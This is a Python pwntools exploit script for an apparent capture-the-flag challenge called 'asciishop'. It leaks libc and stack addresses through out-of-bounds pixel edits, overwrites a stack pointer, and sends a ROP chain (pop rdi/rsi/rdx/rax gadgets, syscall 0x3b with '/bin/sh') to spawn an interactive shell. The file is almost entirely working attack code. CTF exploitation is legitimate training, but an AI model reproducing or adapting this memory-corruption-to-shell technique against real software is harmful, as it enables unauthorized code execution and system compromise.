from pwn import *
from bitstring import Bits
from argparse import ArgumentParser

OFFSET_LEAK_LIBC = 0x5d40
OFFSET_STACK_PTR = 0x615c
OFFSET_LEAK_STACK = 0x6048
OFFSET_OFFSET = 0x418
MAGIC = 0x10a38c
STDIN_OFFSET = 0x3eba83
BIN_SH = 0x1B3E9A

# LIBC gadgets 
POP_RDI = 0x000000000002155f
POP_RSI = 0x0000000000023e6a
POP_RDX = 0x0000000000001b96
POP_RAX = 0x00000000000439c8
SYSCALL = 0x00000000000d2975

# MAIN MENU

def uploadAscii(id, image, row=32, col=32, offset=0):
    c.recvuntil('>>> ')
    c.sendline('1')
    c.recvuntil('Ascii id: ')
    c.send(id)
    c.recvuntil('Upload ascii')
    c.send('ASCI' + p32(col) + p32(row) + p32(offset) + image)

def downloadAscii(id):
    c.recvuntil('>>> ')
    c.sendline('2')
    c.recvuntil('Ascii id: ')
    c.send(id)
    return c.recvuntil('<<<EOF').split('<<<EOF')[0]

def deleteAscii(id):
    c.recvuntil('>>> ')
    c.sendline('3')
    c.recvuntil('Ascii id: ')
    c.send(id)

def moveToAsciiShop():
    c.recvuntil('>>> ')
    c.sendline('4')

# END MAIN MENU

# ASCII SHOP MENU

def touchupAscii(id):
    c.recvuntil('>>> ')
    c.sendline('1')
    c.recvuntil('Ascii id: ')
    c.send(id)

def addFilter(id, filter):
    c.recvuntil('>>> ')
    c.sendline('2')
    c.recvuntil('Ascii id: ')
    c.send(id)
    c.recvuntil('Upload filter')
    c.send(filter)

def quitAsciiShop():
    c.recvuntil('>>> ')
    c.sendline('4')

# END ASCII SHOP MENU

# TOUCHUP MENU

def changePixel(x, y, character):
    c.recvuntil('>>> ')
    c.sendline('1')
    c.recvuntil('pixel: ')
    c.sendline('(' + str(x) + ', ' + str(y) + ') ' + character)

def printGrid():
    c.recvuntil('>>> ')
    c.sendline('2')
    return c.recvuntil('1. Change Pixel').split('1. Change Pixel')[0]

def quitTouchup():
    c.recvuntil('>>> ')
    c.sendline('4')

# END TOUCHUP MENU

# Parsing argument
p = ArgumentParser()
p.add_argument('-r', '--remote', action='store_true')
args = p.parse_args()


# Generic image
image = ''
for i in range(32):
    image += (chr(0x41 + i) * 32)

if args.remote == True:
    c = remote('challenges.fbctf.com', 1340)
else:
    args.remote = False
    c = process('./asciishop')

raw_input()

if not args.remote:
    for i in range(5):
        for j in range(16):
            uploadAscii(str(32 * i + j).rjust(7, '0'), image)

uploadAscii('WRITE00', image, 0x80000000, 0x80000000, 0x80000000)
uploadAscii('READ000', image)

# Leak LIBC
moveToAsciiShop()
touchupAscii('WRITE00')
changePixel(OFFSET_OFFSET, 0, chr(OFFSET_LEAK_LIBC & 0xFF))
changePixel(OFFSET_OFFSET + 1, 0, chr((OFFSET_LEAK_LIBC >> 8) & 0xFF))
quitTouchup()
touchupAscii('READ000')
leak = printGrid()
leak = leak.split(' 0 |')[1].split('\n')[0].replace('ffffff', '').replace('   ', ' \x00').replace('  ', ' ')
leak = leak.split(' ')[1:]
libc_base = 0
for i in range(6):
    if len(leak[i]) == 2:
        libc_base += int(leak[i], 16) << (8 * i)
    else:
        libc_base += ord(leak[i]) << (8 * i)
print 'LIBC base: ' + hex(libc_base)
quitTouchup()

# Leak stack
touchupAscii('WRITE00')
changePixel(OFFSET_OFFSET, 0, chr(OFFSET_LEAK_STACK & 0xFF))
changePixel(OFFSET_OFFSET + 1, 0, chr((OFFSET_LEAK_STACK >> 8) & 0xFF))
quitTouchup()
touchupAscii('READ000')
leak = printGrid()
leak = leak.split(' 0 |')[1].split('\n')[0].replace('ffffff', '').replace('   ', ' \x00').replace('  ', ' ')
leak = leak.split(' ')[1:]
stack_position = 0
for i in range(6):
    if len(leak[i]) == 2:
        stack_position += int(leak[i], 16) << (8 * i)
    else:
        stack_position += ord(leak[i]) << (8 * i)
stack_position = stack_position -0x70 + 0x400 
print 'Stack position: ' + hex(stack_position)
quitTouchup()

# Forging new stack ptr
touchupAscii('WRITE00')
for i in range(6):
    changePixel(OFFSET_STACK_PTR + i, 0, chr(((stack_position) >> (8 * i)) & 0xFF))
quitTouchup()

# ROP
filter_ascii = p64(0x0)
filter_ascii += p64(libc_base + POP_RDI)
filter_ascii += p64(libc_base + BIN_SH)
filter_ascii += p64(libc_base + POP_RSI)
filter_ascii += p64(0x0)
filter_ascii += p64(libc_base + POP_RDX)
filter_ascii += p64(0x0)
filter_ascii += p64(libc_base + POP_RAX)
filter_ascii += p64(0x3b)
filter_ascii += p64(libc_base + SYSCALL)
filter_ascii = filter_ascii.ljust(0x400, '\x00')

addFilter('READ000', filter_ascii)

quitAsciiShop()

c.interactive()